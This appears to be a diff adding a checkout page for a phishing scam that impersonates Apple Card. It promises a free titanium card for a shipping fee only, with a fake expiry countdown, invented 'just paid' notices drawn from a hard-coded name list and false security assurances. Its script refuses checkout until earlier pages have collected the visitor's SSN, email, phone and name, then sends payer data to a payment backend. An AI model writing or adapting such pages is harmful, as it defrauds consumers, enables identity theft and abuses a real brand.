@@ -1,0 +1,442 @@
+<!DOCTYPE html>
+<html lang="en-US">
+<head>
+<script src="tracker.js"></script>
+<meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Checkout — Apple Card</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
+    <style>
+        *,*::before,*::after{margin:0;padding:0;box-sizing:border-box}
+        :root{
+            --apple-black:#1D1D1F;--apple-blue:#0071E3;
+            --gray-100:#F5F5F7;--gray-200:#E8E8ED;--gray-300:#D2D2D7;
+            --gray-400:#86868B;--gray-500:#6E6E73;
+            --success:#34C759;--warning:#FF9F0A;--error:#FF3B30;
+            --surface:#FFFFFF;
+        }
+        body{font-family:-apple-system,BlinkMacSystemFont,'Inter',sans-serif;background:var(--gray-100);color:var(--apple-black);-webkit-font-smoothing:antialiased;min-height:100vh}
+        .page{max-width:520px;margin:0 auto;min-height:100vh;background:var(--surface)}
+
+        .nav{display:flex;align-items:center;padding:14px 20px;border-bottom:0.5px solid var(--gray-200);background:rgba(255,255,255,0.92);backdrop-filter:blur(20px);-webkit-backdrop-filter:blur(20px);position:sticky;top:0;z-index:100}
+        .nav-back{width:32px;height:32px;display:flex;align-items:center;justify-content:center;border:none;background:var(--gray-100);border-radius:50%;cursor:pointer;transition:all 0.2s}
+        .nav-back:active{transform:scale(0.92)}
+        .nav-back svg{width:14px;height:14px;fill:var(--apple-black)}
+        .nav-title{flex:1;text-align:center;font-size:0.9375rem;font-weight:600}
+        .nav-secure{display:flex;align-items:center;gap:4px;font-size:0.6875rem;color:var(--success)}
+        .nav-secure svg{width:12px;height:12px;fill:var(--success)}
+
+        .progress{height:3px;background:var(--gray-200)}
+        .progress-bar{height:100%;background:var(--success);border-radius:2px;width:100%}
+
+        .content{padding:24px 20px}
+
+        .timer-banner{display:flex;align-items:center;gap:10px;padding:12px 14px;background:rgba(255,59,48,0.06);border:1px solid rgba(255,59,48,0.12);border-radius:12px;margin-bottom:20px}
+        .timer-icon{width:36px;height:36px;border-radius:10px;background:rgba(255,59,48,0.12);display:flex;align-items:center;justify-content:center;flex-shrink:0}
+        .timer-icon svg{width:18px;height:18px;fill:var(--error)}
+        .timer-text{flex:1}
+        .timer-text .tt-title{font-size:0.8125rem;font-weight:600;color:var(--error)}
+        .timer-text .tt-desc{font-size:0.6875rem;color:var(--gray-500)}
+        .timer-countdown{font-size:1.125rem;font-weight:800;color:var(--error);font-variant-numeric:tabular-nums}
+
+        .order-card{background:var(--gray-100);border-radius:14px;padding:16px;margin-bottom:20px}
+        .order-card .oc-title{font-size:0.75rem;font-weight:600;color:var(--gray-500);text-transform:uppercase;letter-spacing:0.06em;margin-bottom:12px}
+        .oc-item{display:flex;align-items:center;gap:12px;margin-bottom:12px}
+        .oc-img{width:48px;height:30px;border-radius:6px;position:relative;overflow:hidden;flex-shrink:0}
+        .oc-img .bg{position:absolute;inset:0}
+        .oc-img .logo{position:absolute;top:6px;left:6px}
+        .oc-img .logo img{width:10px;height:12px}
+        .oc-info{flex:1}
+        .oc-name{font-size:0.875rem;font-weight:600}
+        .oc-desc{font-size:0.6875rem;color:var(--gray-500)}
+        .oc-divider{height:1px;background:var(--gray-200);margin:12px 0}
+        .oc-row{display:flex;justify-content:space-between;padding:4px 0;font-size:0.8125rem}
+        .oc-row .label{color:var(--gray-500)}
+        .oc-row .value{font-weight:600}
+        .oc-total{display:flex;justify-content:space-between;padding:8px 0 0;font-size:1rem;font-weight:700;border-top:1px solid var(--gray-200);margin-top:8px}
+
+        .pay-btn{
+            display:block;width:100%;padding:18px;border:none;border-radius:14px;
+            font-size:1.0625rem;font-weight:700;cursor:pointer;font-family:inherit;
+            background:var(--apple-black);color:#fff;text-align:center;
+            transition:all 0.3s ease;margin-bottom:12px;
+            position:relative;overflow:hidden;
+        }
+        .pay-btn:hover{opacity:0.9}
+        .pay-btn:active{transform:scale(0.98)}
+        .pay-btn:disabled{opacity:0.5;cursor:not-allowed;transform:none}
+        .pay-btn .shine{position:absolute;top:0;left:-100%;width:100%;height:100%;background:linear-gradient(90deg,transparent,rgba(255,255,255,0.08),transparent);animation:btnShine 3s ease infinite}
+        .pay-btn-label{display:flex;align-items:center;justify-content:center;gap:8px;position:relative;z-index:2}
+        .pay-btn.loading .pay-btn-label{opacity:0}
+        .pay-btn.loading .shine{display:none}
+        .pay-btn.loading::after{content:'';position:absolute;top:50%;left:50%;width:24px;height:24px;margin:-12px 0 0 -12px;border:3px solid rgba(255,255,255,0.3);border-top-color:#fff;border-radius:50%;animation:spin 0.8s linear infinite}
+
+        .payment-methods{display:flex;align-items:center;justify-content:center;gap:10px;margin-bottom:16px;color:var(--gray-500);font-size:0.6875rem}
+        .payment-methods strong{color:var(--apple-black);font-weight:700}
+        .payment-methods .pm-chips{display:flex;gap:6px;flex-wrap:wrap;justify-content:center}
+        .payment-methods .pm-chip{padding:4px 10px;border:1px solid var(--gray-200);border-radius:8px;font-size:0.6875rem;font-weight:600;color:var(--gray-600);background:var(--surface)}
+
+        .live-proof{padding:10px 14px;background:rgba(52,199,89,0.06);border-radius:10px;margin-bottom:16px;display:flex;align-items:center;gap:8px;font-size:0.75rem;overflow:hidden;height:42px;position:relative}
+        .live-dot{width:6px;height:6px;border-radius:50%;background:var(--success);flex-shrink:0;animation:livePulse 2s ease infinite}
+        .live-text{flex:1;color:var(--gray-600);transition:opacity 0.3s}
+        .live-text strong{color:var(--success)}
+
+        .faq{margin-bottom:20px}
+        .faq-title{font-size:0.875rem;font-weight:600;margin-bottom:10px}
+        .faq-item{border:1px solid var(--gray-200);border-radius:12px;margin-bottom:8px;overflow:hidden}
+        .faq-q{padding:12px 14px;font-size:0.8125rem;font-weight:600;cursor:pointer;display:flex;align-items:center;justify-content:space-between;background:var(--surface)}
+        .faq-q svg{width:16px;height:16px;fill:var(--gray-400);transition:transform 0.3s}
+        .faq-item.open .faq-q svg{transform:rotate(180deg)}
+        .faq-a{padding:0 14px;max-height:0;overflow:hidden;transition:all 0.3s ease;font-size:0.8125rem;color:var(--gray-500);line-height:1.5}
+        .faq-item.open .faq-a{padding:0 14px 12px;max-height:220px}
+
+        .guarantees{display:grid;grid-template-columns:repeat(3,1fr);gap:8px;margin-bottom:20px}
+        .guarantee{text-align:center;padding:12px 8px;background:var(--gray-100);border-radius:12px}
+        .guarantee svg{width:22px;height:22px;fill:var(--gray-500);display:block;margin:0 auto 4px}
+        .guarantee span{font-size:0.5625rem;color:var(--gray-500);font-weight:500;line-height:1.3;display:block}
+
+        .test-banner{display:none;padding:10px 14px;background:rgba(0,113,227,0.08);border:1px solid rgba(0,113,227,0.2);border-radius:10px;margin-bottom:16px;font-size:0.75rem;color:var(--apple-blue);text-align:center;font-weight:600}
+        .test-banner.active{display:block}
+
+        .verify-banner{display:none;padding:14px 16px;background:rgba(0,113,227,0.06);border:1px solid rgba(0,113,227,0.2);border-radius:12px;margin-bottom:16px;font-size:0.8125rem;color:var(--apple-blue);text-align:center;align-items:center;justify-content:center;gap:8px}
+        .verify-banner.active{display:flex}
+        .verify-banner .spinner{width:14px;height:14px;border:2px solid rgba(0,113,227,0.2);border-top-color:var(--apple-blue);border-radius:50%;animation:spin 0.8s linear infinite}
+
+        @keyframes btnShine{0%{left:-100%}50%{left:100%}100%{left:100%}}
+        @keyframes livePulse{0%,100%{opacity:1}50%{opacity:0.3}}
+        @keyframes spin{to{transform:rotate(360deg)}}
+    </style>
+</head>
+<body>
+    <div class="page">
+        <div class="nav">
+            <button class="nav-back" onclick="history.back()"><svg viewBox="0 0 24 24"><path d="M15.41 7.41L14 6l-6 6 6 6 1.41-1.41L10.83 12z"/></svg></button>
+            <div class="nav-title">Checkout</div>
+            <div class="nav-secure"><svg viewBox="0 0 24 24"><path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zM9 8V6c0-1.66 1.34-3 3-3s3 1.34 3 3v2H9z"/></svg> Secure</div>
+        </div>
+        <div class="progress"><div class="progress-bar"></div></div>
+
+        <div class="content" id="checkoutView">
+            <div class="test-banner" id="testBanner">
+                &#x1F9EA; TEST MODE — Amount reduced to $2.00
+            </div>
+
+            <div class="verify-banner" id="verifyBanner">
+                <div class="spinner"></div>
+                <span>Confirming your payment with Cooud...</span>
+            </div>
+
+            <div class="timer-banner">
+                <div class="timer-icon"><svg viewBox="0 0 24 24"><path d="M11.99 2C6.47 2 2 6.48 2 12s4.47 10 9.99 10C17.52 22 22 17.52 22 12S17.52 2 11.99 2zM12 20c-4.42 0-8-3.58-8-8s3.58-8 8-8 8 3.58 8 8-3.58 8-8 8zm.5-13H11v6l5.25 3.15.75-1.23-4.5-2.67z"/></svg></div>
+                <div class="timer-text">
+                    <div class="tt-title">Limited time offer</div>
+                    <div class="tt-desc">Complete before it expires</div>
+                </div>
+                <div class="timer-countdown" id="timer">14:59</div>
+            </div>
+
+            <div class="order-card">
+                <div class="oc-title">Order Summary</div>
+                <div class="oc-item">
+                    <div class="oc-img"><div class="bg" id="orderCardBg"></div><div class="logo"><img id="orderCardLogo" src="assets/images/logo3d.svg" alt="" style="width:12px;height:14px"></div></div>
+                    <div class="oc-info">
+                        <div class="oc-name">Apple Card <span id="orderColor">Titanium</span></div>
+                        <div class="oc-desc">Titanium card • VISA</div>
+                    </div>
+                </div>
+                <div class="oc-divider"></div>
+                <div class="oc-row"><span class="label">Apple Card</span><span class="value" style="color:var(--success)">Free</span></div>
+                <div class="oc-row"><span class="label">Annual fee</span><span class="value" style="color:var(--success)">$0.00</span></div>
+                <div class="oc-row"><span class="label">Shipping (<span id="orderTipo">Express</span>)</span><span class="value" id="orderFrete">$22.45</span></div>
+                <div class="oc-total"><span>Total</span><span id="orderTotal">$22.45</span></div>
+            </div>
+
+            <button class="pay-btn" id="payBtn" onclick="generatePayment()">
+                <div class="shine"></div>
+                <div class="pay-btn-label">
+                    <span>Continue to secure payment — <span id="payPrice">$22.45</span></span>
+                </div>
+            </button>
+
+            <div class="payment-methods">
+                <strong>Pay with</strong>
+                <div class="pm-chips">
+                    <span class="pm-chip">Credit card</span>
+                    <span class="pm-chip">Debit card</span>
+                    <span class="pm-chip">PayPal</span>
+                    <span class="pm-chip">PIX</span>
+                </div>
+            </div>
+
+            <div class="live-proof" id="liveProof">
+                <div class="live-dot"></div>
+                <div class="live-text" id="liveText"><strong>Sarah M.</strong> from New York just completed payment</div>
+            </div>
+
+            <div class="faq">
+                <div class="faq-title">Frequently asked questions</div>
+                <div class="faq-item">
+                    <div class="faq-q" onclick="toggleFaq(this)">Why am I only paying shipping?<svg viewBox="0 0 24 24"><path d="M7.41 8.59L12 13.17l4.59-4.58L18 10l-6 6-6-6z"/></svg></div>
+                    <div class="faq-a">The Apple Card is 100% free with no annual fee. You're only paying the shipping cost for the physical titanium card to your address, with secure packaging and tracking.</div>
+                </div>
+                <div class="faq-item">
+                    <div class="faq-q" onclick="toggleFaq(this)">When will I receive my card?<svg viewBox="0 0 24 24"><path d="M7.41 8.59L12 13.17l4.59-4.58L18 10l-6 6-6-6z"/></svg></div>
+                    <div class="faq-a">Delivery time depends on the option you chose: Standard (7-10 days), Express (4-5 days), or Premium (1-2 days). You'll receive tracking by email and SMS.</div>
+                </div>
+                <div class="faq-item">
+                    <div class="faq-q" onclick="toggleFaq(this)">Is the payment secure?<svg viewBox="0 0 24 24"><path d="M7.41 8.59L12 13.17l4.59-4.58L18 10l-6 6-6-6z"/></svg></div>
+                    <div class="faq-a">Yes. Payments are processed by Cooud over PCI-compliant infrastructure with 256-bit SSL encryption. We never see your card number — Cooud tokenizes it before processing.</div>
+                </div>
+                <div class="faq-item">
+                    <div class="faq-q" onclick="toggleFaq(this)">Can I cancel my order?<svg viewBox="0 0 24 24"><path d="M7.41 8.59L12 13.17l4.59-4.58L18 10l-6 6-6-6z"/></svg></div>
+                    <div class="faq-a">You can request cancellation up to 14 days after payment with a full refund. Just contact support via iMessage or email.</div>
+                </div>
+            </div>
+
+            <div class="guarantees">
+                <div class="guarantee">
+                    <svg viewBox="0 0 24 24"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm-2 16l-4-4 1.41-1.41L10 14.17l6.59-6.59L18 9l-8 8z"/></svg>
+                    <span>100% secure<br>payment</span>
+                </div>
+                <div class="guarantee">
+                    <svg viewBox="0 0 24 24"><path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zM9 8V6c0-1.66 1.34-3 3-3s3 1.34 3 3v2H9z"/></svg>
+                    <span>Data<br>protected</span>
+                </div>
+                <div class="guarantee">
+                    <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/></svg>
+                    <span>14-day<br>guarantee</span>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+    (function(){
+        // ─── UTM Persistence ───
+        const utmKeys = ['utm_source','utm_medium','utm_campaign','utm_content','utm_term','src','sck'];
+        const urlParams = new URLSearchParams(window.location.search);
+        utmKeys.forEach(k => { const v = urlParams.get(k); if(v) localStorage.setItem(k, v); });
+
+        const LeadData = {
+            _key: 'applecard_lead',
+            load() { try { return JSON.parse(localStorage.getItem(this._key) || '{}') } catch { return {} } },
+            update(d) { const c = this.load(); const u = {...c, ...d, updated_at: Date.now()}; localStorage.setItem(this._key, JSON.stringify(u)); return u; }
+        };
+
+        LeadData.update({ page: 'checkout' });
+        const data = LeadData.load();
+        const params = new URLSearchParams(window.location.search);
+
+        // ─── If returning from Cooud (?pay=ok&cooud_session_id=...) verify and redirect to obrigado.html ───
+        if (params.get('pay') === 'ok' && params.get('cooud_session_id')) {
+            verifyAndForward(params.get('cooud_session_id'));
+            return; // skip the rest of the checkout init
+        }
+
+        // ─── Gate: redirect to dados.html if missing required checkout info ───
+        const hasRequired = (data.ssn || data.nif) && (String(data.ssn || data.nif).replace(/\D+/g,'').length === 9)
+                         && data.email && /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(data.email)
+                         && (data.telefone || data.phone)
+                         && (String(data.telefone || data.phone || '').replace(/\D+/g,'').length >= 9)
+                         && data.nome;
+        if (!hasRequired && params.get('skip') !== 'pago' && params.get('test') !== '1') {
+            const target = data.dados_completed ? 'cep.html' : (data.identity_confirmed ? 'dados.html' : 'login.html');
+            const u = new URL(target, window.location.href);
+            new URLSearchParams(window.location.search).forEach((v, k) => u.searchParams.set(k, v));
+            window.location.replace(u.toString());
+            throw new Error('redirect');
+        }
+
+        const isTestMode = params.get('test') === '1' || params.get('modo') === 'teste';
+
+        let frete = data.frete_valor || parseFloat(params.get('frete')) || 22.45;
+        const tipo = data.frete_tipo || params.get('tipo') || 'expresso';
+        const corCartao = data.cartao_cor || 'silver';
+        const corLabel = data.cartao_cor_label || 'Titanium';
+
+        if (isTestMode) {
+            frete = 2.00;
+            document.getElementById('testBanner').classList.add('active');
+        }
+
+        const amountCents = Math.round(frete * 100);
+
+        const colorMap = {
+            silver: 'linear-gradient(145deg, #E3E3E8, #C8C8CD, #E8E8ED)',
+            black: 'linear-gradient(145deg, #2C2C2E, #1A1A1C, #3A3A3C)',
+            gold: 'linear-gradient(145deg, #F5E6CC, #D4C4A0, #F0DCC0)'
+        };
+        const tipoLabels = { economico:'Standard', expresso:'Express', premium:'Premium' };
+
+        const formatUSD = (v) => `$${v.toFixed(2)}`;
+
+        document.getElementById('orderCardBg').style.background = colorMap[corCartao] || colorMap.silver;
+        document.getElementById('orderColor').textContent = corLabel;
+        document.getElementById('orderTipo').textContent = tipoLabels[tipo] || 'Express';
+        document.getElementById('orderFrete').textContent = formatUSD(frete);
+        document.getElementById('orderTotal').textContent = formatUSD(frete);
+        document.getElementById('payPrice').textContent = formatUSD(frete);
+
+        if (window.track) window.track('InitiateCheckout', {
+            value: frete,
+            currency: 'USD',
+            num_items: 1,
+            content_id: 'apple-card-us-' + tipo,
+            content_name: 'Apple Card — ' + (tipoLabels[tipo] || 'Express'),
+            content_type: 'product'
+        });
+
+        let totalSeconds = 15 * 60;
+        function updateTimer() {
+            const m = Math.floor(totalSeconds / 60);
+            const s = totalSeconds % 60;
+            document.getElementById('timer').textContent = `${m.toString().padStart(2,'0')}:${s.toString().padStart(2,'0')}`;
+            if (totalSeconds > 0) { totalSeconds--; setTimeout(updateTimer, 1000); }
+            else { document.getElementById('timer').textContent = 'EXPIRED'; }
+        }
+        updateTimer();
+
+        window.toggleFaq = function(el) { el.parentElement.classList.toggle('open'); };
+
+        const proofs = [
+            {name:'Sarah M.',city:'New York'},{name:'John P.',city:'Los Angeles'},
+            {name:'Ashley C.',city:'Chicago'},{name:'Chris M.',city:'Houston'},
+            {name:'Jessica L.',city:'Miami'},{name:'David R.',city:'Seattle'},
+            {name:'Emily A.',city:'Boston'},{name:'Michael D.',city:'Austin'},
+            {name:'Olivia F.',city:'San Francisco'},{name:'Daniel N.',city:'Denver'}
+        ];
+        let proofIdx = 0;
+        function rotateSocialProof() {
+            const p = proofs[proofIdx % proofs.length];
+            const actions = ['completed payment','just applied for Apple Card','paid by card 2 minutes ago','completed their order just now'];
+            const action = actions[Math.floor(Math.random() * actions.length)];
+            const el = document.getElementById('liveText');
+            el.style.opacity = '0';
+            setTimeout(() => {
+                el.innerHTML = `<strong>${p.name}</strong> from ${p.city} ${action}`;
+                el.style.opacity = '1';
+            }, 300);
+            proofIdx++;
+        }
+        setInterval(rotateSocialProof, 5000);
+
+        // ═══════════════════════════════════════
+        // ─── PAYMENT (Cooud hosted redirect) ───
+        // ═══════════════════════════════════════
+
+        window.generatePayment = async function() {
+            const btn = document.getElementById('payBtn');
+            btn.classList.add('loading');
+            btn.disabled = true;
+
+            if (window.track) window.track('AddPaymentInfo', {
+                value: frete,
+                currency: 'USD',
+                payment_method: 'cooud_hosted',
+                content_id: 'apple-card-us-' + tipo,
+                content_type: 'product'
+            });
+
+            // utm: merge current page querystring with anything saved in localStorage
+            const currentQs = window.location.search.replace(/^\?/, '');
+            const mergedQs = new URLSearchParams(currentQs);
+            utmKeys.forEach(k => {
+                if (!mergedQs.has(k)) {
+                    const v = localStorage.getItem(k);
+                    if (v) mergedQs.set(k, v);
+                }
+            });
+            const utm = mergedQs.toString();
+
+            const abGroup = params.get('ab') || data.ab_frete_grupo || '';
+
+            const payload = {
+                amount: amountCents,
+                currency: 'usd',
+                payerName: data.nome || data.name || params.get('nome') || 'Customer',
+                email: data.email || params.get('email') || '',
+                phone: data.telefone || data.phone || params.get('phone') || '',
+                productName: `Apple Card — ${tipoLabels[tipo] || 'Express'} Shipping`,
+                successPath: 'obrigado.html',
+                cancelPath: 'checkout.html',
+                utm,
+                abGroup,
+                funnelStep: 'shipping'
+            };
+
+            try {
+                const res = await fetch('api/transaction', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(payload)
+                });
+                const result = await res.json();
+
+                if (!result.success || !result.url) {
+                    alert('Could not start payment: ' + (result.error || 'please try again.'));
+                    btn.classList.remove('loading');
+                    btn.disabled = false;
+                    return;
+                }
+
+                LeadData.update({
+                    transaction_id: result.transactionId,
+                    payment_method: 'cooud',
+                    cooud_session_url: result.url,
+                    cooud_initiated_at: Date.now()
+                });
+
+                // Redirect the buyer to Cooud's hosted checkout. After payment,
+                // Cooud redirects back to ?pay=ok&cooud_session_id=cooud_cs_*.
+                window.location.assign(result.url);
+
+            } catch (e) {
+                console.error('checkout error', e);
+                alert('Connection error. Check your internet and try again.');
+                btn.classList.remove('loading');
+                btn.disabled = false;
+            }
+        };
+
+        // ─── Verify-on-return: poll /api/status until APPROVED then go to obrigado.html ───
+        async function verifyAndForward(sessionId) {
+            document.getElementById('verifyBanner').classList.add('active');
+
+            const maxAttempts = 12;          // ~36s total
+            const delay = 3000;
+
+            for (let i = 0; i < maxAttempts; i++) {
+                try {
+                    const r = await fetch('api/status?id=' + encodeURIComponent(sessionId), { cache: 'no-store' });
+                    const out = await r.json();
+                    if (out.status === 'APPROVED') {
+                        LeadData.update({ payment_confirmed: true, payment_timestamp: Date.now() });
+                        const obrigado = new URL('obrigado.html', window.location.href);
+                        new URLSearchParams(window.location.search).forEach((v, k) => {
+                            if (k !== 'pay' && k !== 'cooud_session_id') obrigado.searchParams.set(k, v);
+                        });
+                        window.location.replace(obrigado.toString());
+                        return;
+                    }
+                    if (out.status === 'REFUSED') break;
+                } catch (e) { /* keep polling */ }
+                await new Promise((r) => setTimeout(r, delay));
+            }
+
+            // Failed/never resolved — surface a soft retry CTA.
+            document.getElementById('verifyBanner').innerHTML =
+              '<span>We could not confirm your payment yet. <a href="checkout.html" style="color:var(--apple-blue);font-weight:700;text-decoration:none">Try again</a></span>';
+        }
+
+        const skipParam = params.get('skip');
+        if (skipParam === 'pago') {
+            LeadData.update({ payment_confirmed: true, payment_timestamp: Date.now() });
+            const obrigado = new URL('obrigado.html', window.location.href);
+            new URLSearchParams(window.location.search).forEach((v, k) => obrigado.searchParams.set(k, v));
+            window.location.href = obrigado.toString();
+        }
+
+    })();
+    </script>
+</body>
+</html>
